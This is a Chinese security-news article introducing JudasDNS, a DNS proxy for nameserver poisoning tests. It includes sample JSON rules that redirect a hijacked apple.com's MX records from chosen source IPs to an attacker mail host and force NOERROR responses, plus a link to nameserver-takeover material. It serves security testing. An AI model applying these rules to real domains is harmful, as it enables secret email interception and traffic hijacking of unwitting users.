**![](https://image.3001.net/images/20200222/1582365659_5e50fbdb9a7d3.png!small)**

**JudasDNS是一款针对DNS域名服务器的安全测试工具，在JudasDNS的帮助下，广大安全研究人员可以方便地对目标域名服务器进行DNS投毒攻击测试，以确保域名服务器的安全性。**

JudasDNS可以帮助研究人员构建和部署DNS代理服务器，并代替已接管的域名服务器以执行目标攻击。JudasDNS可以代理某个域名的合法域名服务器的所有DNS查询请求，JudasDNS的规则配置允许我们根据源IP或DNS查询类型来修改DNS响应，这也就意味着攻击者可以配置一台恶意域名服务器来实现：有选择地重新路由来自指定源IP地址范围（通过修改的MX记录）的入站电子邮件，设置数据长度非常长的TTL，或执行DNS缓存投毒等攻击活动。

##  工具下载

广大用户可以直接点击下列链接直接下载已打包的JudasDNS：【[JudasDNS-master.zip](https://github.com/mandatoryprogrammer/JudasDNS/archive/master.zip)】

或者，你也可以运行下列命令直接将项目源码克隆至本地：

    
    
    git clone https://github.com/mandatoryprogrammer/JudasDNS.git

![](https://image.3001.net/images/20200222/1582365675_5e50fbeb3a92a.png!small)

##  如何使用JudasDNS

下面给出的是JudasDNS针对测试样例场景中的配置样本代码，在这个场景中，我们已经拿到了或接管了一台苹果的权威域名服务器（apple.com）：

    
    
    {
    
            "version": "1.0.0",
    
            "port": 2248,
    
            "dns_query_timeout": 10000,
    
            "target_nameservers": [ "17.254.0.59", "17.254.0.50", "17.112.144.50", "17.112.144.59", "17.171.63.30", "17.171.63.40", "17.151.0.151", "17.151.0.152" ],
    
            "rules": [
    
                {
    
                    "name": "Secretly redirect all emails coming from 127.0.0.1!",
    
                    "query_type_matches": [ "MX" ],
    
                    "ip_range_matches": [ "127.0.0.1/32" ],
    
                    "modifications": [
    
                        {
    
                            "answer": [
    
                                {
    
                                    "name": "apple.com",
    
                                    "type": 15,
    
                                    "class": 1,
    
                                    "ttl": 10,
    
                                    "priority": 10,
    
                                    "exchange": "hacktheplace.localhost"
    
                                }
    
                            ]
    
                        }
    
                    ]
    
                },
    
                {
    
                    "name": "Make all responses NOERROR even if they've failed.",
    
                    "query_type_matches": [ "*" ],
    
                    "modifications": [
    
                        {
    
                            "header": {
    
                                "rcode": 0
    
                            }
    
                        }
    
                    ]
    
                }
    
            ]
    
        }

###  配置参数值解析

> 1、version：配置文件格式版本（当前为1.0.0）；
>
> 2、port：Judas的运行端口；
>
> 3、dns_query_timeout：在放弃来自上游目标名称服务器的答复之前等待多长时间（毫秒）；
>
> 4、target_nameservers：目标域名的合法域名服务器，所有的DNS查询都将从这里由Judas代表所有的请求客户端来发出；
>
> 5、rules：对DNS响应进行修改的规则列表；
>
> 6、name：给定规则的名称；
>
> 7、query_type_matches：待匹配的查询类型列表，例如CNAME、A记录等，还可以使用*通配符来匹配任意类型的查询类型；
>
> 8、ip_range_matches：待匹配的IP范围列表，用于选择性地对特定范围IP的响应进行欺骗攻击；
>
> 9、modifications：查看README的“Modifications”数据段；

##  Modifications

JudasDNS的规则提供了modifications规范，这个规范可以帮助我们识别DNS响应在发送回客户端之前，对其进行了哪些修改。在修改响应内容之前，我们还需要查看DNS节点文档来了解DNS响应结构。

下面给出的是一个DNS响应格式样本：

    
    
    { header: 
    
           { id: 25373,
    
             qr: 1,
    
             opcode: 0,
    
             aa: 1,
    
             tc: 0,
    
             rd: 1,
    
             ra: 0,
    
             res1: 0,
    
             res2: 0,
    
             res3: 0,
    
             rcode: 5 },
    
          question: [ { name: 'apple.com', type: 2, class: 1 } ],
    
          answer: 
    
           [ { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver2.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver4.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver3.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver5.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'nserver6.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'adns2.apple.com' },
    
             { name: 'apple.com',
    
               type: 2,
    
               class: 1,
    
               ttl: 86400,
    
               data: 'adns1.apple.com' } ],
    
          authority: [],
    
          additional: [],
    
          edns_options: [],
    
          payload: undefined,
    
          address: undefined,
    
        ...trimmed for brevity...

注意：如需了解更多关于DNS响应数据结构的内容，可以查看【这篇文档】。

编写一个modifications规则非常简单，下面给出的是一套样本规则：

    
    
    {
    
          "name": "Make all responses NOERROR even if they've failed.",
    
          "query_type_matches": [ "*" ],
    
          "modifications": [
    
            {
    
              "header": {
    
                "rcode": 0
    
              }
    
            }
    
          ]
    
        }

上述规则可以匹配任意类型的查询请求，并且会将DNS响应中的header.rcode值设置为0.

下面给出的是另一个样本规则以供大家参考：

    
    
    {
    
          "name": "Secretly redirect all emails coming from 127.0.0.1!",
    
          "query_type_matches": [ "MX" ],
    
          "ip_range_matches": [ "127.0.0.1/32" ],
    
          "modifications": [
    
            {
    
              "answer": [
    
                {
    
                  "name": "apple.com",
    
                  "type": 15,
    
                  "class": 1,
    
                  "ttl": 10,
    
                  "priority": 10,
    
                  "exchange": "hacktheplace.localhost"
    
                }
    
              ]
    
            }
    
          ]
    
        }

##  规则匹配类型

###  请求方IP

下面的规则可以匹配一个客户端的IP地址：

    
    
    {
    
          "name": "Make all responses requested from localhost (127.0.0.1) NOERROR.",
    
          "ip_range_matches": [ "127.0.0.1/32" ],
    
          "modifications": [
    
            {
    
              "header": {
    
                "rcode": 0
    
              }
    
            }
    
          ]
    
        }

##  请求查询类型

下面的规则可以匹配MX和CNAME这两个查询类型，并应用相应的modification规则：

    
    
    {
    
          "name": "Make all responses NOERROR even if they've failed.",
    
          "query_type_matches": [ "MX", "CNAME" ],
    
          "modifications": [
    
            {
    
              "header": {
    
                "rcode": 0
    
              }
    
            }
    
          ]
    
        }

##  响应状态码

下面的规则可以匹配NXDOMAIN的响应码，并应用相应的modification规则：

    
    
    {
    
          "name": "Make all responses requested from localhost (127.0.0.1) NOERROR.",
    
          "response_code_matches": [ "NXDOMAIN" ],
    
          "modifications": [
    
            {
    
              "header": {
    
                "rcode": 0
    
              }
    
            }
    
          ]
    
        }

##  如何接管一台域名服务器

关于如何接管DNS域名服务器的话题，并非本文所要讨论的重点，如果你想了解更多关于域名服务器接管或DNS劫持的相关内容，可以参考【[这篇文章](https://thehackerblog.com/respect-my-authority-hijacking-broken-nameservers-to-compromise-your-target/)】。

##  项目地址

> JudasDNS：【[GitHub传送门](https://github.com/mandatoryprogrammer/JudasDNS)】

 *** 参考来源：[darknet](https://www.darknet.org.uk/2020/02/judas-dns-nameserver-dns-poisoning-attack-tool/?utm_source=feedly&utm_medium=webfeeds)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

